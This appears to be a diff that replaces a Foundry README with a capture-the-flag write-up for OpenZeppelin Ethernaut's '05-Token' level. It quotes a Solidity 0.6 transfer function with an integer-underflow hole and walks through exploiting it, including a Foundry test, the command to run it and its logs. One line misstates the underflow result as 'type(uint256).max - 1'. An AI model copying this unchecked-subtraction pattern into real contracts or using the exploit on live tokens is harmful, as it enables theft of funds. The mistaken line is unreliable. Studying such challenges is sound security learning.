@@ -1,66 +1,89 @@
-## Foundry
+# What is OpenZeppelin Ethernaut?
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.
 
-Foundry consists of:
+OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](ethernaut.openzeppelin.com)
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+<br>
 
-## Documentation
+# What You're Supposed to Do?
 
-https://book.getfoundry.sh/
+in `05-Token` Challenge, You Should Try To find a Way to Mint Yourself Alot of Tokens (kinda).
 
-## Usage
+`05-Token` Challenge Link: [https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)
 
-### Build
 
-```shell
-$ forge build
+<br>
+
+# How did i Complete This Challenge?
+
+This One is Simple. Since the Solidity Version of the Codebase is `^0.6.0`, it's Vulnerable to `Overflow/Underflow`, Unless We Use `SafeMath` Library from Openzeppelin Which we Clearly Didn't.
+
+Now Lets take a Look at `transfer` function:
+
+
+```
+    function transfer(address _to, uint256 _value) public returns (bool) {
+            require(balances[msg.sender] - _value >= 0);
+            balances[msg.sender] -= _value;
+            balances[_to] += _value;
+            return true;
+    }
 ```
 
-### Test
 
-```shell
-$ forge test
+first of all We dont Check if the `msg.sender` has enough tokens to transfer (something like this `require(balances[msg.sender] >= _value);`).
+
+and lets say Attacker has Two External Owned Accounts (user1 and user2). 
+
+Attacker Calls the `transfer` function with `user1` and Sends `10e18` to `user2`. (`msg.sender` == `user1`, `_to` == `user2`, `_value` == `10e18`)
+
+Lets go Through the `transfer` function Line by Line with Above Values and Parameters:
+
+```javascript
+    require(balances[msg.sender] - _value >= 0);
+    require(0 - 10e18 >= 0);
 ```
 
-### Format
+Since We Use `^0.6.0` Solidity Version, the Math Equation of `0 - 10e18` will underflow and the result will be: `require(type(uint256).max - 1  >= 0)` which will clearly pass.
 
-```shell
-$ forge fmt
+then Lets Take a Look at Next Two Lines:
+
+```javascript
+    balances[msg.sender] -= _value;
+  // 0 -= 10e18 will result in: type(uint256).max - 1 (user1 balance)
+
+    balances[_to] += _value;
+  // 0 += 10e18 will result in: 10e18 (user2 balance)
 ```
 
-### Gas Snapshots
+And This is How You Can Solve `05-Token` Challenge from Openzeppelin Ethernaut!
 
-```shell
-$ forge snapshot
+by the Way i Also Wrote Test for it, named as `testTransferfunction` inside the `Token.t.sol` file:
+
+```javascript
+    function testTransferfunction() external {
+        vm.startPrank(userOne);
+        token.transfer(userTwo, 10e18);
+        assertEq(token.balanceOf(userTwo), 10e18);
+        assertEq(token.balanceOf(userOne), (type(uint256).max - 10e18) + 1);
+        vm.stopPrank();
+
+        console.log("Balance of User1: ", token.balanceOf(userOne));
+        console.log("Balance of User2: ", token.balanceOf(userTwo));
+    }
 ```
 
-### Anvil
+You Can Run the Test With Following Command in Your Terminal: (Required to Have Foundry Installed.)
 
-```shell
-$ anvil
+```javascript
+    forge test --match-test testTransferfunction -vvvv
 ```
 
-### Deploy
+Output of the `Logs`:
 
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+```javascript
+    Logs:
+        Balance of User1:  115792089237316195423570985008687907853269984665640564039447584007913129639936
+        Balance of User2:  10000000000000000000
 ```
